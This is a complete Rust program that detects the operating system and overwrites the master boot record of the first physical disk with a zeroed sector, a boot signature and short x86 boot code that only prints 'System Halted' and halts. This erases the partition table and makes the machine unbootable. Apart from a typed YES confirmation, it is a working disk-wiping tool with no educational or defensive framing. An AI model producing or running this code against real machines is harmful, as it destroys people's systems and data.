use std::fs::OpenOptions;
use std::io::Write;

#[cfg(target_os = "linux")]
fn get_disk_path() -> &'static str {
    "/dev/sda"  // First SATA/SCSI disk on Linux
}

#[cfg(target_os = "windows")]
fn get_disk_path() -> &'static str {
    "\\\\.\\PhysicalDrive0"
}

fn main() -> std::io::Result<()> {
    let disk_path = get_disk_path();
    
    println!("Detected OS: {}", std::env::consts::OS);
    println!("Using drive: {}", disk_path);
    println!("WARNING: This will overwrite the MBR.");
    println!("Type 'YES' to continue:");
    
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    
    if input.trim() != "YES" {
        println!("Operation cancelled.");
        return Ok(());
    }

    let mut mbr = vec![0u8; 512];
    let message = b"System Halted";
    
    let bootcode: &[u8] = &[
        0xB8, 0x00, 0x00,       // MOV AX, 0
        0x8E, 0xD8,             // MOV DS, AX
        0xB8, 0x00, 0x07,       // MOV AX, 0x0700
        0x8E, 0xC0,             // MOV ES, AX
        0xBE, 0x20, 0x7C,       // MOV SI, message
        0xB4, 0x0E,             // MOV AH, 0x0E
        0xB7, 0x07,             // MOV BH, 0x07 (page 0, white on black)
        0xB3, 0x07,             // MOV BL, 0x07 (white on black)
        0xAC,                   // LODSB
        0x08, 0xC0,             // OR AL, AL
        0x74, 0x06,             // JZ halt
        0xCD, 0x10,             // INT 0x10
        0xEB, 0xF5,             // JMP SHORT loop
        0xF4,                   // HLT
        0xEB, 0xFD              // JMP SHORT $
    ];
    
    mbr[..bootcode.len()].copy_from_slice(bootcode);
    let msg_offset = 0x20;
    mbr[msg_offset..msg_offset + message.len()].copy_from_slice(message);
    mbr[msg_offset + message.len()] = 0;
    
    mbr[510] = 0x55;
    mbr[511] = 0xAA;
    
    let mut file = OpenOptions::new()
        .write(true)
        .open(disk_path)?;
        
    file.write_all(&mbr)?;
    
    println!("MBR has been written successfully.");
    Ok(())
}